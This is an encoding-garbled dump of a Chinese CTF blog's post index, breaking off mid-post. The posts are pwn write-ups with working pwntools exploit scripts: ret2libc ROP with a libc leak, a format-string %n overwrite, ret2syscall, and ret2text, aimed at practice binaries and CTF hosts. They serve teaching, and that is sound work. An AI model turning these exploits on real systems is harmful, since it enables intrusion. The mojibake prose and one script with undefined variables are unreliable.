å…¶å®åšè¿™é¢˜ä¸»è¦è¿˜æ˜¯æ¨¡ä»¿å¤§ä½¬ä»¬å†™çš„expï¼Œå¥½å¤šç»†èŠ‚éƒ½ä¸æ¸…æ¥šï¼Œä½†æ˜¯æ„Ÿè§‰åšäº†é‚£ä¹ˆä¹…åˆä¸èƒ½æ‰”åœ¨é‚£è¾¹ç­‰å®Œå…¨æ‡‚äº†å†å†™é¢˜è§£ æ„Ÿè§‰å¥½æµªè´¹è¿˜å¾—å†ç ”ç©¶å•Š å‚è€ƒèµ„æ–™ï¼š [BUUCTF]PWN6â€”â€”ciscn_2019_c_1","categories":[{"name":"å…¥é—¨é›†è®­wp","slug":"å…¥é—¨é›†è®­wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.io/tags/BUUCTF/"}]},{"title":"week4&&week5-T4","slug":"week4-week5-T4","date":"2023-04-01T07:35:47.000Z","updated":"2024-01-31T02:37:05.285Z","comments":true,"path":"posts/e234b4c5/","link":"","permalink":"http://lmarch2.github.io/posts/e234b4c5/","excerpt":"T4 ret2libc3 2021-01-30WPctf-wiki ret2libc3è€ƒç‚¹ï¼šæ ˆæº¢å‡ºrop","text":"T4 ret2libc3 2021-01-30WPctf-wiki ret2libc3è€ƒç‚¹ï¼šæ ˆæº¢å‡ºrop 0x01è¿™ä¸ªæ˜¯çœŸçš„éš¾â€¦â€¦ é¦–å…ˆå¾—é€å½»ç†è§£gotå’Œpltï¼Œå…¶æ¬¡è¿˜å¾—å¯¹expçš„å†™ä½œè¦æœ‰ä¸€å®šçš„ç†Ÿç»ƒåº¦ï¼Œè€Œä¸”è¿˜æœ‰å„ç§å„æ ·å¤æ€ªçš„å†™æ³•â€¦â€¦ ç°åœ¨æˆ‘è¿˜å¾ˆå¤šåœ°æ–¹ç¢ç£¨ä¸æ¸…æ¥šï¼Œåªæ˜¯ä¾è‘«èŠ¦ç”»ç“¢åœ°å¤ç›˜äº†ä¸€ä¸‹ï¼Œç°åœ¨è¿™ç¯‡é¢˜è§£åªæ˜¯å†™ä¸ªå¤§æ¡†æ¶ï¼Œå…·ä½“ç»†èŠ‚åé¢æ…¢æ…¢è¡¥å……äº†â€¦â€¦ file checksec â€”â€” 32-bit å¼€NX æ¼æ´å’Œå†…å­˜åˆ†æå’Œä¹‹å‰çš„ç³»åˆ—é¢˜ç±»ä¼¼ï¼Œä¸èµ˜è¿°äº† 0x02IDAçœ‹æºç ï¼Œæ—¢æ²¡æœ‰systemä¹Ÿæ²¡æœ‰binsh ç”±linuxå»¶è¿Ÿç»‘å®šæœºåˆ¶çš„çŸ¥è¯†ï¼ˆåé¢å†å†™ä¸€ç¯‡æ€»ç»“å§ï¼‰å¯çŸ¥ï¼Œæˆ‘ä»¬å¦‚æœè¦è°ƒç”¨systemå‡½æ•°ï¼Œå°±è¦çŸ¥é“ä»–çš„gotè¡¨ä¸­çš„åœ°å€ï¼Œä½†libcè¢«åŠ è½½åˆ°çš„å†…å­˜çš„ä½ç½®æ˜¯éšæœºçš„ï¼Œæˆ‘ä»¬æ— æ³•å¾—çŸ¥ä¸è¿‡ï¼ŒåŒä¸€ç‰ˆæœ¬çš„libcçš„ä¸¤ä¸ªåº“å‡½æ•°åœ¨libcä¸­çš„ç›¸å¯¹ä½ç½®æ˜¯ä¸å˜çš„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥çŸ¥é“ä¸€ä¸ªå·²ç»æ‰§è¡Œè¿‡çš„å‡½æ•°çš„gotè¡¨åœ°å€ï¼Œç„¶åç¡®å®šlibcçš„ç‰ˆæœ¬ï¼Œå°±å¯ä»¥åŠ ä¸Šå’Œsystemå‡½æ•°çš„åç§»ï¼Œä»è€Œå¾—åˆ°systemå‡½æ•°çš„çœŸå®åœ°å€ï¼ˆgotè¡¨åœ°å€ï¼‰è€Œç°åœ¨æˆ‘ä»¬æœ‰ä¸€ä¸ªputså‡½æ•°ï¼Œlibcä¸­ä¹Ÿæœ‰systemå’Œbinsh 0x03æˆ‘ä»¬åªéœ€è¦é€šè¿‡æ ˆæº¢å‡ºåˆ©ç”¨putså‡½æ•°ï¼Œæ‰“å°putså‡½æ•°çš„gotè¡¨ä¸­çš„åœ°å€ï¼Œç„¶åè·å–åç§»ï¼Œå¾—åˆ°systemå‡½æ•°å’Œ/bin/shå­—ç¬¦ä¸²çš„åœ°å€ï¼Œå†å°†putså‡½æ•°çš„è¿”å›åœ°å€è¦†ç›–ä¸ºsystemå‡½æ•°çš„åœ°å€å³å¯æˆ‘ä»¬å¯ä»¥å…ˆè¿è¡Œexp1ï¼ˆè§0x04ï¼‰æ‹¿åˆ°è·å–putsçš„çœŸå®åœ°å€ï¼Œç„¶åå»libc- database -searchçš„ç½‘ç«™æŸ¥è¯¢ï¼Œå¯å¾—åˆ°putså‡½æ•°systemå‡½æ•°å’Œbinshå­—ç¬¦ä¸²å¯¹åº”çš„åç§»åœ°å€ ï¼ˆè¿™é‡Œç›´æ¥ç›—å›¾äº†â€¦â€¦ï¼‰ çŸ¥é“äº†putså‡½æ•°çš„çœŸå®åœ°å€å’Œåç§»ä¹‹åï¼Œå°±å¯ä»¥å°†putså‡½æ•°çš„çœŸå®åœ°å€å‡å»åç§»åœ°å€ï¼Œå¾—åˆ°libcçš„åŸºå€ï¼Œå°†libcçš„åŸºå€åˆ†åˆ«ä¸systemï¼Œ/bin/shå­—ç¬¦ä¸²çš„åç§»ç›¸åŠ ï¼Œå°±å¯ä»¥å¾—åˆ°å¯¹åº”çš„çœŸå®åœ°å€ç„¶åå†™å®Œæ•´çš„exp 0x04æ‰€ä»¥å…¶å®expæ˜¯åˆ†ä¸¤éƒ¨çš„ï¼Œç¬¬ä¸€æ­¥æ˜¯æ„é€ æ ˆæº¢å‡ºåˆ©ç”¨putså‡½æ•°æ‰“å°å‡ºçœŸå®åœ°å€ï¼›ç¬¬äºŒæ­¥æ˜¯æº¢å‡ºè¦†ç›–è‡³systemå‡½æ•°å’Œ/bin/shçš„åœ°å€ï¼Œæ‹¿åˆ°shell #first exp from pwn import * elf=ELF('ret2libc3') p=process('./ret2libc3') puts_plt=elf.plt['puts'] puts_got=elf.got['puts'] start_addr = elf.symbols['_start'] payload1=b'A'*112+p32(puts_plt)+p32(start_addr)+p32(puts_got) p.sendlineafter(\"!?\",payload1) puts_addr=u32(p.recv(4)) print(\"puts_got_addr = \",hex(puts_got_addr)) print(\"puts_plt_addr = \",hex(puts_plt_addr)) print(\"main_plt_addr = \",hex(main_plt_addr)) print(\"puts addr = \", hex(puts_addr)) p.interactive() #second exp from pwn import * p = process('./ret2libc3') elf = ELF('./ret2libc3') puts_got_addr = elf.got['puts'] puts_plt_addr = elf.plt['puts'] main_plt_addr = elf.symbols['_start'] print(\"puts_got_addr = \",hex(puts_got_addr)) print(\"puts_plt_addr = \",hex(puts_plt_addr)) print(\"main_plt_addr = \",hex(main_plt_addr)) p.recv() p.sendline(payload) puts_addr = u32(p.recv()[0:4]) print(\"puts_addr = \",hex(puts_addr)) sys_offset = 0x03cd10 puts_offset = 0x067360 sh_offset = 0x17b8cf #æ ¹æ®å…¬å¼ libcåŸºåœ°å€ + å‡½æ•°åç§»é‡ = å‡½æ•°çœŸå®åœ°å€ æ¥è®¡ç®— libc_base_addr = puts_addr - puts_offset #è®¡ç®—å‡ºlibcåŸºåœ°å€ sys_addr = libc_base_addr + sys_offset #è®¡ç®—å‡ºsystemçš„çœŸå®åœ°å€ sh_addr = libc_base_addr + sh_offset #è®¡ç®—å‡º/bin/shçš„çœŸå®åœ°å€ print(\"libc_base_addr = \",hex(libc_base_addr)) print(\"sys_addr = \",hex(sys_addr)) print(\"sh_addr = \",hex(sh_addr)) payload2 = flat([b'A'*112, p32(sys_addr), \"AAAA\", p32(sh_addr)]) p.sendline(payload2) p.interactive() 0x05è¿˜æœ‰å…¶ä»–å‡ ç§æ–¹æ³•ç›®å‰æ²¡ç”¨ææ‡‚ä¹‹åå­¦ä¼šäº†ï¼ˆçœ‹æ‡‚äº†ï¼‰å†å†™è¿‡é—®ï¼š p.recv()[0:4]å’Œp.recv(4ï¼‰çš„åŒºåˆ«ï¼Ÿï¼Ÿç½‘ä¸Šæ²¡æœåˆ°è¦åœ¨æœ¬åœ°æ‰“é€šæ˜¯ä¸æ˜¯è¦å¯¹libcåšä»€ä¹ˆæ“ä½œå‘€ å‚è€ƒèµ„æ–™ï¼š pwnå°ç™½å…¥é—¨06â€“ret2libc åŸºæœ¬ROPä¹‹ret2libc3 yichenäºŒè¿›åˆ¶å®‰å…¨","categories":[{"name":"å…¥é—¨é›†è®­wp","slug":"å…¥é—¨é›†è®­wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"ctf-wiki","slug":"ctf-wiki","permalink":"http://lmarch2.github.io/tags/ctf-wiki/"}]},{"title":"week4&&week5-T3","slug":"week4-week5-T3","date":"2023-04-01T07:35:34.000Z","updated":"2024-01-31T02:36:50.519Z","comments":true,"path":"posts/7c502166/","link":"","permalink":"http://lmarch2.github.io/posts/7c502166/","excerpt":"T3 [ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5 2023-01-27WPBUUCTF pwnç¬¬ä¸ƒé¢˜è€ƒç‚¹ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´","text":"T3 [ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5 2023-01-27WPBUUCTF pwnç¬¬ä¸ƒé¢˜è€ƒç‚¹ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ 0x01file &amp;&amp; checksec â€”â€” 32 bit , å¼€å¯NXï¼Œå¼€å¯cannary è¿™å°±æ²¡æ³•æ ˆæº¢å‡ºäº†è¿è¡Œç¨‹åºçœ‹çœ‹è¾“å‡º 0x02 IDAæŸ¥çœ‹ä»£ç  å…ˆæ‰¾string window å‘ç°/bin/shï¼Œè¿›ä¸€æ­¥æŸ¥çœ‹å‘ç°ç¨‹åºå°±æ˜¯å…ˆè¯»å–ç”¨æˆ·åï¼Œå†è¯»å…¥å¯†ç ï¼Œç„¶åå†å°†ç”¨æˆ·è¾“å…¥çš„å¯†ç å’Œç”Ÿæˆçš„ä¸€ä¸ªéšæœºå¯†ç æ¯”è¾ƒï¼Œæ­£ç¡®åˆ™æ‰§è¡Œsystem(/bin/sh)ï¼Œé”™è¯¯åˆ™è¾“å‡ºfail è§‚å¯Ÿå‘ç°printf(&amp;buf);å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ ï¼ˆå…³äºæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„ç›¸å…³çŸ¥è¯†ä¼šå¦å†™ä¸€ç¯‡ï¼‰ 0x03 ç°åœ¨å¯ä»¥åˆ©ç”¨%næ¥ä¿®æ”¹å‚æ•°é‡Œçš„å†…å®¹ï¼Œæˆ‘ä»¬ä¸çŸ¥é“è¯»å…¥çš„éšæœºæ•°æ˜¯å¤šå°‘ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°†å®ƒæ”¹æˆæˆ‘ä»¬å†™å…¥çš„æ•°æ®å°±å¥½äº† é¦–å…ˆåˆ©ç”¨æµ‹è¯•æ•°æ®â€AAAA %08x %08x %08x %08x %08x %08x %08xâ€¦â€¦â€¦â€¦ â€œæ¥ç¡®å®šåç§»é‡ï¼Œ å‘ç°è¾“å…¥çš„æ•°æ®æ˜¯æ ˆçš„ç¬¬åä¸ª å¹¶ä¸”å­˜æ”¾ç”Ÿæˆçš„éšæœºå¯†ç çš„åœ°å€æ˜¯ä»0x0804C044å¼€å§‹çš„ï¼Œå…±å››å­—èŠ‚ç©ºé—´ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨%10$,%11$,%12$,%13$å»å®šä½åˆ°è¿™4ä¸ªåœ°å€ï¼Œå†ç”¨%nä¿®æ”¹è¿™äº›åœ°å€é‡Œçš„å†…å®¹ å¯ä»¥æ„é€ payloadäº† 0x04 from pwn import* p=remote('node4.buuoj.cn',28332) addr = 0x804c044 payload=p32(addr)+p32(addr+1)+p32(addr+2)+p32(addr+3) payload+=b'%10$n%11$n%12$n%13$n' p.sendline(payload) p.sendline(str(0x10101010)) p.interactive() å› ä¸ºæ€»å…±è¾“å…¥äº†å››ä¸ªåœ°å€ï¼Œå…±16ä½ï¼Œæ‰€ä»¥%næ‰€èµ‹å€¼çš„æ•°æ˜¯16ï¼Œæ‰€ä»¥ç”¨æˆ·è¾“å…¥å¯†ç æ—¶å‘é€çš„æ•°æ®ä¸º0x10101010","categories":[{"name":"å…¥é—¨é›†è®­wp","slug":"å…¥é—¨é›†è®­wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.io/tags/BUUCTF/"}]},{"title":"week4&&week5-T2","slug":"week4-week5-T2","date":"2023-04-01T07:35:07.000Z","updated":"2024-01-31T02:36:22.417Z","comments":true,"path":"posts/b5711f0/","link":"","permalink":"http://lmarch2.github.io/posts/b5711f0/","excerpt":"T2 ret2syscall 2023-01-22WPctf-wiki åŸºç¡€ropè€ƒç‚¹ï¼šret2syscall é¢˜ç›®é“¾æ¥","text":"T2 ret2syscall 2023-01-22WPctf-wiki åŸºç¡€ropè€ƒç‚¹ï¼šret2syscall é¢˜ç›®é“¾æ¥ 0x01file checksec â€”â€” 32-bit å¼€å¯NXä¿æŠ¤ï¼Œå †æ ˆä¸å¯æ‰§è¡Œè€Œä¸”æ³¨æ„è¿™æ˜¯statically linkedï¼ˆé™æ€é“¾æ¥ï¼‰ï¼Œä¸èƒ½é€šè¿‡æ³„éœ²åº“å‡½æ•°åœ°å€è·å–systemå‡½æ•°åœ°å€ 0x02IDAçœ‹æºç ï¼Œå‘ç°æ²¡æœ‰systemå‡½æ•°å¯ç”¨æœ‰getså‡½æ•°ï¼Œåº”è¯¥æ˜¯é€šè¿‡å®ƒå®ç°æ ˆæº¢å‡º ç”±0x01å¯çŸ¥æˆ‘ä»¬ä¸èƒ½ç›´æ¥åˆ©ç”¨ç¨‹åºä¸­çš„æŸä¸€æ®µä»£ç æˆ–è€…è‡ªå·±å¡«å†™ä»£ç æ¥è·å¾— shellï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨ç¨‹åºä¸­çš„ gadgets æ¥è·å¾— shellï¼Œè€Œå¯¹åº”çš„ shell è·å–åˆ™æ˜¯åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨ã€‚é‡‡å–ä½¿ç”¨ret2syscallå³æ§åˆ¶ç¨‹åºæ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œè·å– shellã€‚ ä¹Ÿå°±æ˜¯æˆ‘ä»¬åªéœ€è¦æŠŠå„ä¸ªå‚æ•°æ”¾åœ¨å¯¹åº”çš„å¯„å­˜å™¨ä¸­ï¼Œæ‰§è¡Œint 0x80 å°±å¯å®ç°å¯¹ç³»ç»Ÿçš„è°ƒç”¨ 0x03åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨æ¥è·å–shell execve(â€œ/bin/shâ€,NULL,NULL) å…³äºç³»ç»Ÿè°ƒç”¨è¡¥å……çŸ¥è¯†è§0x05 æ„é€ çš„ç›®æ ‡å¦‚ä¸‹ ç³»ç»Ÿè°ƒç”¨å·ï¼Œå³ eax åº”è¯¥ä¸º 0xb ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³ ebx åº”è¯¥æŒ‡å‘ /bin/sh çš„åœ°å€ï¼Œå…¶å®æ‰§è¡Œ sh çš„åœ°å€ä¹Ÿå¯ä»¥ã€‚ ç¬¬äºŒä¸ªå‚æ•°ï¼Œå³ ecx åº”è¯¥ä¸º 0 ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå³ edx åº”è¯¥ä¸º 0 æˆ‘ä»¬è¦æ‰¾åˆ°ç³»ç»Ÿè°ƒç”¨ç›¸å¯¹äºçš„å¯„å­˜å™¨çš„å€¼é¦–å…ˆè¦è®©EAX = 0xbï¼Œé‚£ä¹ˆéœ€è¦çš„æŒ‡ä»¤æ˜¯ pop eax ï¼›ä½†æ˜¯æˆ‘ä»¬å¹¶ä¸èƒ½æœŸå¾…æœ‰ä¸€æ®µè¿ç»­çš„ä»£ç å¯ä»¥åŒæ—¶æ§åˆ¶å¯¹åº”çš„å¯„å­˜å™¨ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€æ®µä¸€æ®µæ§åˆ¶ï¼Œæ‰€ä»¥popä¹‹åè¿˜éœ€è¦ä¸€ä¸ªretè¿”å›åˆ°æ§åˆ¶ç¨‹åºæ‰§è¡Œæµï¼Œ pop eax ï¼›ret é€‰æ‹©è¿™ä¸ªåœ°å€ï¼š 0x080bb196 : pop eax ; ret åŒç†ï¼ŒæŸ¥æ‰¾æ§åˆ¶å…¶ä»–ä¸‰ä¸ªå¯„å­˜å™¨çš„gadget æˆ‘ä»¬é€‰æ‹©è¿™ä¸ªåœ°å€ï¼š 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret è¿™ä¸ªå¯ä»¥ç›´æ¥æ§åˆ¶å…¶å®ƒä¸‰ä¸ªå¯„å­˜å™¨ã€‚ è¿˜è¦è·å–/bin/shçš„åœ°å€0x80BE408 è¿˜æœ‰int 0x80çš„åœ°å€ 0x08049421 0x04å¯ä»¥å†™expäº† from pwn import * p = process(\"./rop\") pop_eax_ret = 0x080bb196 pop_edx_ecx_ebx_ret = 0x0806eb90 int_0x80 = 0x08049421 binsh = 0x80be408 payload = flat([b'A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80]) #åç§»é‡çš„è®¡ç®—æ–¹æ³•å’Œret2textçš„ç›¸åŒ p.sendline(payload) p.interactive() 0x05è¡¥å……ä¸€äº›ç³»ç»Ÿè°ƒç”¨çš„ç›¸å…³çŸ¥è¯† Linux åœ¨x86ä¸Šçš„ç³»ç»Ÿè°ƒç”¨é€šè¿‡ int 80h å®ç°ï¼Œç”¨ç³»ç»Ÿè°ƒç”¨å·ï¼ˆåœ¨ /usr/include/x86_64-linux-gnu/asm/unistd_64.h å’Œ /usr/include/x86_64-linux-gnu/asm/unistd_32.h åˆ†åˆ«å¯ä»¥æŸ¥çœ‹ 64 ä½å’Œ 32 ä½çš„ç³»ç»Ÿè°ƒç”¨å·ã€‚ï¼‰æ¥åŒºåˆ†å…¥å£å‡½æ•°ã€‚ æ“ä½œç³»ç»Ÿå®ç°ç³»ç»Ÿè°ƒç”¨çš„åŸºæœ¬è¿‡ç¨‹æ˜¯ï¼š åº”ç”¨ç¨‹åºè°ƒç”¨åº“å‡½æ•°ï¼ˆAPIï¼‰ï¼› API å°†ç³»ç»Ÿè°ƒç”¨å·å­˜å…¥ EAXï¼Œç„¶åé€šè¿‡ä¸­æ–­è°ƒç”¨ä½¿ç³»ç»Ÿè¿›å…¥å†…æ ¸æ€ï¼› å†…æ ¸ä¸­çš„ä¸­æ–­å¤„ç†å‡½æ•°æ ¹æ®ç³»ç»Ÿè°ƒç”¨å·ï¼Œè°ƒç”¨å¯¹åº”çš„å†…æ ¸å‡½æ•°ï¼ˆç³»ç»Ÿè°ƒç”¨ï¼‰ï¼› ç³»ç»Ÿè°ƒç”¨å®Œæˆç›¸åº”åŠŸèƒ½ï¼Œå°†è¿”å›å€¼å­˜å…¥ EAXï¼Œè¿”å›åˆ°ä¸­æ–­å¤„ç†å‡½æ•°ï¼› ä¸­æ–­å¤„ç†å‡½æ•°è¿”å›åˆ° API ä¸­ï¼› API å°† EAX è¿”å›ç»™åº”ç”¨ç¨‹åº åº”ç”¨ç¨‹åºè°ƒç”¨ç³»ç»Ÿè°ƒç”¨çš„è¿‡ç¨‹æ˜¯ï¼š æŠŠç³»ç»Ÿè°ƒç”¨çš„ç¼–å·å­˜å…¥ EAXï¼› æŠŠå‡½æ•°å‚æ•°å­˜å…¥å…¶å®ƒé€šç”¨å¯„å­˜å™¨ï¼› è§¦å‘ 0x80 å·ä¸­æ–­ï¼ˆint 0x80ï¼‰ Linuxåœ¨ç”¨int 0x80è¿›è¡Œç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œè°ƒç”¨å·å­˜åœ¨äºEAXï¼Œç¬¬ä¸€ä¸ªå‚æ•°å­˜åœ¨äºEBXï¼Œç¬¬äºŒä¸ªå‚æ•°å­˜åœ¨äºECXï¼Œç¬¬ä¸‰ä¸ªå‚æ•°å­˜åœ¨äºEDX æ›´å¤šç³»ç»Ÿè°ƒç”¨å·å¯å‚è€ƒ å‚è€ƒæ–‡ç«  Referenceå‚è€ƒæ–‡ç« ï¼š ret2syscallçŸ¥è¯†ç‚¹åŠä¾‹é¢˜ret2syscallLinuxç³»ç»Ÿè°ƒç”¨å· - gsharpsh00ter - åšå®¢å›­ (cnblogs.com)","categories":[{"name":"å…¥é—¨é›†è®­wp","slug":"å…¥é—¨é›†è®­wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"ctf-wiki","slug":"ctf-wiki","permalink":"http://lmarch2.github.io/tags/ctf-wiki/"}]},{"title":"week4 T1","slug":"week4&&week5-T1","date":"2023-01-20T15:36:57.000Z","updated":"2024-01-31T02:42:34.735Z","comments":true,"path":"posts/64ef4d6b/","link":"","permalink":"http://lmarch2.github.io/posts/64ef4d6b/","excerpt":"Week4&amp;&amp;Week5 T1 jarvisoj_level02023-01-20WPBUUCTF pwn ç¬¬å…­é¢˜è€ƒç‚¹ï¼š ç®€å•æ ˆæº¢å‡º/åŸºæœ¬rop ret2text","text":"Week4&amp;&amp;Week5 T1 jarvisoj_level02023-01-20WPBUUCTF pwn ç¬¬å…­é¢˜è€ƒç‚¹ï¼š ç®€å•æ ˆæº¢å‡º/åŸºæœ¬rop ret2text 0x01file checksec â€”â€” 64-bitï¼Œå¼€NX 0x02IDAæŸ¥çœ‹å‘ç°mainå‡½æ•°é‡Œçš„vulnerable_function()å‡½æ•°é‡Œçš„readå‡½æ•°è¯»å–0x200ullï¼Œè€Œbufç©ºé—´åªæœ‰0x80åˆæ‰¾åˆ°æœ‰system(â€œ/bin/shâ€)è¿”å›å…¶åœ°å€ 0x03exp from pwn import * p = remote(\"node4.buuoj.cn\",29175) ret_arr = 0X40059A payload = b'a'*(0x80 + 0x8) + p64(ret_arr) p.sendline(payload) p.interactive()","categories":[{"name":"å…¥é—¨é›†è®­wp","slug":"å…¥é—¨é›†è®­wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.io/tags/BUUCTF/"}]},{"title":"week3 T5","slug":"week3-T5","date":"2023-01-15T14:43:00.000Z","updated":"2024-01-31T02:34:54.737Z","comments":true,"path":"posts/fe55b1cb/","link":"","permalink":"http://lmarch2.github.io/posts/fe55b1cb/","excerpt":"T5 level2 2023-01-15WPæ”»é˜²ä¸–ç•Œpwné¢˜è€ƒç‚¹ï¼šret2libc1ï¼ˆä¸æ˜¯æˆ‘ä¸æƒ³å¾€ä¸‹åšï¼Œè€Œæ˜¯å¾€ä¸‹åšçš„è¯çœŸçš„æ˜¯è¦è¡¥å¤ªå¤šçŸ¥è¯†äº†ï¼Œæ–°çš„çŸ¥è¯†è¿˜æ²¡å­¦ä¼šï¼Œåªå¥½æ‰¾ä¸€é¢˜æ¥åˆ’ä¸€ä¸‹æ°´äº†â€¦â€¦ï¼‰","text":"T5 level2 2023-01-15WPæ”»é˜²ä¸–ç•Œpwné¢˜è€ƒç‚¹ï¼šret2libc1ï¼ˆä¸æ˜¯æˆ‘ä¸æƒ³å¾€ä¸‹åšï¼Œè€Œæ˜¯å¾€ä¸‹åšçš„è¯çœŸçš„æ˜¯è¦è¡¥å¤ªå¤šçŸ¥è¯†äº†ï¼Œæ–°çš„çŸ¥è¯†è¿˜æ²¡å­¦ä¼šï¼Œåªå¥½æ‰¾ä¸€é¢˜æ¥åˆ’ä¸€ä¸‹æ°´äº†â€¦â€¦ï¼‰ 0x01fileï¼Œchecksec â€”â€” 32-bitï¼Œå¼€å¯NX 0x02IDAä¸€çœ‹æ²¡å•¥ï¼Œç‚¹è¿›vulnå‡½æ•°æ‰¾åˆ°ä¸€ä¸ªreadå‡½æ•°ç”±å›¾ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œbufåˆ†é…çš„ç©ºé—´ä¸º0x88,è€Œreadå‡½æ•°è¯»å–0x100ï¼Œæ˜¾ç„¶å­˜åœ¨æº¢å‡ºshift+f12æ‰¾åˆ°æœ‰å­—ç¬¦ä¸²/bin/shï¼Œå¹¶ä¸”åœ¨vulnå‡½æ•°é‡Œæœ‰systemå‡½æ•°ï¼Œåªä¸è¿‡å‚æ•°æ˜¯â€ehco Inputï¼šâ€ç½¢äº†è®°ä¸‹systemå‡½æ•°çš„pltè¡¨åœ°å€0x08048320 è¿™æ ·å°±åªéœ€è¦æˆ‘ä»¬è¦†ç›–bufï¼Œå°†systemå‡½æ•°åœ°å€å†™ä¸ºè¿”å›åœ°å€ï¼Œå¹¶å°†/bin/shä½œä¸ºå‚æ•°ä¼ é€’å…¶åœ°å€å³å¯ 0x03exp from pwn import * p = remote(' 61.147.171.105 ', 60218) payload = b'a' * (0x88 + 4) + p32(0x08048320)+b'bbbb' + p32(0x0804A024) #0x88ä¸ºbufå¤§å°ï¼Œ+4æ˜¯ebpå¤§å°ï¼Œp32(0x08048320)æ˜¯æ‰“åŒ…systemåœ°å€ï¼Œb'bbbb'æ˜¯å¡«å……æ— æ•ˆsystemè¿”å›åœ°å€ï¼Œ #p32(0x0804A024)æ˜¯/bin/shåœ°å€ p.sendline(payload) p.interactive()","categories":[{"name":"å…¥é—¨é›†è®­wp","slug":"å…¥é—¨é›†è®­wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"æ”»é˜²ä¸–ç•Œ","permalink":"http://lmarch2.github.io/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"week3 T4","slug":"week3-T4","date":"2023-01-15T14:42:38.000Z","updated":"2024-01-31T02:34:46.200Z","comments":true,"path":"posts/8952815d/","link":"","permalink":"http://lmarch2.github.io/posts/8952815d/","excerpt":"T4 ret2shellcode 2 (æ ˆå†™å…¥) 2023-01-15WPsniperoj-pwn100-shellcodeè€ƒç‚¹ï¼šæ ˆæº¢å‡º shellcode","text":"T4 ret2shellcode 2 (æ ˆå†™å…¥) 2023-01-15WPsniperoj-pwn100-shellcodeè€ƒç‚¹ï¼šæ ˆæº¢å‡º shellcode 0x01file ,checksecæ£€æŸ¥ä¿æŠ¤æœºåˆ¶å¼€å¯äº†PIE åœ°å€å˜æ¢ 0x02IDAä¸­çœ‹çœ‹æºç å‘ç°å·²ç»æœ‰è¾“å‡ºäº†bufçš„åœ°å€ï¼Œå› æ­¤éšæœºåŒ–åœ°å€ä¾¿å¯ä»¥è¿›è¡Œç»•è¿‡ç»§ç»­åˆ†æå‘ç°readå‡½æ•°è¯»å…¥0x40å­—èŠ‚ï¼Œè€Œbufåˆ†é…çš„ç©ºé—´æ‰0x10å­—èŠ‚ï¼Œå­˜åœ¨æ ˆæº¢å‡ºæ‰“å¼€string windowï¼Œæ²¡æœ‰systemå’Œ/bin/shï¼Œåº”è¯¥æ˜¯è¦å†™å…¥shellcodeäº† 0x03å…ˆçœ‹çœ‹æˆ‘ä»¬çš„ç©ºé—´èƒ½ä¸èƒ½å†™ä¸‹shellcodeè¿™é‡Œmainå‡½æ•°é‡Œå£°æ˜çš„bufåªæœ‰0x10å³16å­—èŠ‚ï¼Œå±äºå±€éƒ¨å˜é‡ï¼Œç©ºé—´åˆ†é…åœ¨æ ˆä¸ŠgdbåŠ¨æ€è°ƒè¯•ï¼Œï¼ˆå…¶å®IDAèƒ½çœ‹å‡ºæ¥ï¼Œå°±æ˜¯ä¸ç¡®å®šå¯¹ä¸å¯¹å°±æ˜¯äº†ï¼‰æˆ‘ä»¬è®¡ç®—bufçš„åç§»é‡ä¸ºrbp - rsp = 0x7fffde3d2820 - 0x7fffde3d2810 = 10ï¼Œå†åŠ ä¸Šrbp 8å­—èŠ‚ä¸º0x18å³24å­—èŠ‚ 